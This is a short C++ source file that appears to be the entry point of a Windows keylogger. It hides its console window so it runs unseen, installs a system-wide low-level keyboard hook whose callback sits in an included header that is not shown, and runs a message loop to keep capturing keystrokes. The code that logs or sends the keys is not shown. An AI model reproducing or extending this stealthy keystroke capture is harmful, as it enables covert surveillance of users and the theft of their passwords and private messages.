#include "headers/nMyKeyboardProcHook.h"

int main()
{
    ::ShowWindow(::GetConsoleWindow(), SW_HIDE);
    UwuHook::keyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL,
                                             UwuHook::keyBoardProc,
                                             nullptr,
                                             NULL
                                             );
    MSG msg{nullptr};
    while (GetMessage(&msg, nullptr, 0, 0) != 0);
    UnhookWindowsHookEx(UwuHook::keyboardHook);
}